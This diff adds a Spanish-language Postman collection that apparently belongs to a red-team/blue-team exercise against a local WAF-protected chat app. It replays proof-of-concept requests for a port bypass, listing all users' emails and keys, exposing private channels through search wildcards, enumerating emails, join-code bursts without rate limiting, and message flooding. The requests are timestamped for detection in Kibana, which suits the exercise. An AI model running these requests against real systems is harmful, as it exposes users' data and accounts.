@@ -1,0 +1,457 @@
+{
+  "info": {
+    "_postman_id": "7c3f0472-95f6-450b-9075-bac815ceb73a",
+    "name": "Cifrados-WAF · Hito 2 Red Team",
+    "description": "Repetición de los PoC del Hito 2 contra http://localhost:8080 (WAF). Cada petición guarda su hora (America/Guatemala) en ts_<poc> y la imprime en la consola de Postman para que el Blue Team la busque en Kibana.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "0 · Bypass (puerto directo)",
+      "item": [
+        {
+          "name": "API directa :3001 (debe fallar)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_bypass', t);",
+                  "console.log('bypass', t, pm.response.code, pm.response.responseSize + ' bytes');"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url_directo}}/groups",
+              "host": [
+                "{{base_url_directo}}"
+              ],
+              "path": [
+                "groups"
+              ]
+            },
+            "description": "Si responde, la API está expuesta sin pasar por el WAF (hallazgo). Esperado: error de conexión."
+          }
+        }
+      ]
+    },
+    {
+      "name": "1 · Sesión",
+      "item": [
+        {
+          "name": "Login Carol (guarda el token)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_login', t);",
+                  "console.log('login', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "if (pm.response.code === 200) { pm.environment.set('token', pm.response.json().token); }",
+                  "pm.test('login 200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Inicia sesión como Carol y guarda el JWT en la variable token.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"email\": \"{{carol_email}}\", \"password\": \"{{carol_password}}\"}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "2 · Ataques",
+      "item": [
+        {
+          "name": "PoC-01 · GET /api/users (T-15)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc01', t);",
+                  "console.log('poc01', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('200 y varios usuarios', () => { pm.response.to.have.status(200); pm.expect(pm.response.json().users.length).to.be.above(1); });"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "users"
+              ]
+            },
+            "description": "Esperado: 200 con correo y llave de todos los usuarios."
+          }
+        },
+        {
+          "name": "PoC-02a · search?name=direct (T-14)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc02a', t);",
+                  "console.log('poc02a', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('revela canal directo ajeno', () => pm.expect(pm.response.json().groups.some(g => g.name.startsWith('direct:') && !g.is_member)).to.be.true);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/groups/search?name={{poc_search_direct}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "groups",
+                "search"
+              ],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "{{poc_search_direct}}"
+                }
+              ]
+            },
+            "description": "Esperado: canal direct:<Bob>:<Alice> con is_member=false."
+          }
+        },
+        {
+          "name": "PoC-02b · search?name=% (T-14)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc02b', t);",
+                  "console.log('poc02b', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('lista canales ajenos', () => pm.expect(pm.response.json().groups.some(g => !g.is_member)).to.be.true);"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/groups/search?name={{poc_search_wildcard}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "groups",
+                "search"
+              ],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "{{poc_search_wildcard}}"
+                }
+              ]
+            },
+            "description": "poc_search_wildcard = %25 (el % codificado). Esperado: hasta 20 canales, incluidos privados."
+          }
+        },
+        {
+          "name": "PoC-03a · direct-conversations correo existente (T-11)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc03a', t);",
+                  "console.log('poc03a', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/direct-conversations",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "direct-conversations"
+              ]
+            },
+            "description": "Esperado: 200 con id, correo y llave.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"recipient_email\": \"{{poc_enum_existe}}\"}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          }
+        },
+        {
+          "name": "PoC-03b · direct-conversations correo inexistente (T-11)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc03b', t);",
+                  "console.log('poc03b', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('400 distinguible', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/direct-conversations",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "direct-conversations"
+              ]
+            },
+            "description": "Esperado: 400 'Contacto no encontrado.'",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"recipient_email\": \"{{poc_enum_no_existe}}\"}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          }
+        },
+        {
+          "name": "PoC-04 · join con código falso (T-16)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc04', t);",
+                  "console.log('poc04', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('sin 429', () => pm.expect(pm.response.code).to.not.equal(429));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/groups/{{group_g_id}}/join",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "groups",
+                "{{group_g_id}}",
+                "join"
+              ]
+            },
+            "description": "Esperado: 400 'Código de grupo incorrecto' y nunca 429. Para la ráfaga, ejecutar con Collection Runner (30 iteraciones).",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"code\": \"{{poc_join_code}}\"}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          }
+        },
+        {
+          "name": "PoC-05a · bandeja global (T-19)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc05a', t);",
+                  "console.log('poc05a', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('bandeja rota (403)', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/messages/{{carol_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "messages",
+                "{{carol_id}}"
+              ]
+            },
+            "description": "Esperado: 403 'No se pudo completar la operacion.' por la inundación del canal RT-Carol."
+          }
+        },
+        {
+          "name": "PoC-05b · mensajes del canal inundado (T-19)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const t = new Date().toLocaleString('sv-SE', { timeZone: 'America/Guatemala' });",
+                  "pm.environment.set('ts_poc05b', t);",
+                  "console.log('poc05b', t, pm.response.code, pm.response.responseSize + ' bytes');",
+                  "pm.test('1000 mensajes', () => pm.expect(pm.response.json().messages.length).to.be.at.least(1000));"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/groups/{{group_flood_id}}/messages",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "groups",
+                "{{group_flood_id}}",
+                "messages"
+              ]
+            },
+            "description": "Esperado: 200, ~1,27 MB, 1000 mensajes."
+          }
+        }
+      ]
+    }
+  ]
+}
